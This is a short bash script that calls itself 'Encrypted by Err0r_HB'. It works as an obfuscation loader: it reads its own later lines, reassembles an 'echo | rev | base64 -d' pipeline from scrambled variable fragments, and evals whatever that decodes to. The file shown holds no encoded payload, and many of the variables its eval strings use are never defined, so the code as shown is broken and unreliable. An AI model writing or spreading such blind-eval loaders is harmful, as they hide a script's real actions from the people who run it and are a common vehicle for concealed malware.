#!/bin/bash

# Encrypted by Err0r_HB
# Repo https://github.com/Err0r-ICA

skip=50
set -e

case $(printf 'X\n' | tail -n +1 2>/dev/null) in
X) tail_n=-n;;
*) tail_n=;;
esac

z="
";DxD='ov';ko='-d ';XM19l=' bas';O57=' "=
"';kzhB='echo';JEs='ESC';L29uF='64 ';N8GkN='echo';V6xz='-d';D1jp='t" |';Ib3hW='e64 ';ar='"|';
vZ8X1='ev |';LHb=' | r';A3g='er
"';b5o0='prin';DO='-e ';RkPn='base';pgd='" |';si0Y='tf'

if tail $tail_n +$skip <"$0" | eval "$L55$K2TOOk$N8GkN$Q5be$O57$LtZnU$LHb$x6GEf$vZ8X1$E9pw2$PS74o$XM19l$Ib3hW$Lym$V6xz$zf$gY$O0" >/dev/null 2>&1; then
  Fdg=$(eval "$L55$K2TOOk$N8GkN$Q5be$O57$LtZnU$LHb$x6GEf$vZ8X1$E9pw2$PS74o$XM19l$Ib3hW$Lym$V6xz$zf$gY$O0")
  eval "$tau$s1ip5$wpw$UI$Fdg$ydt$Ieh$buokb$P9$S37utx$JzbKn"
else
  printf >&2 '\033[1;91m%s\033[m\n\033[1;97m%s\033[m\n' "Cannot decode ${0##*/}" "Report bugs <fajarrkim@gmail.com>"
  exit 1
fi

# Thank you!
# ¯\_(ツ)_/¯
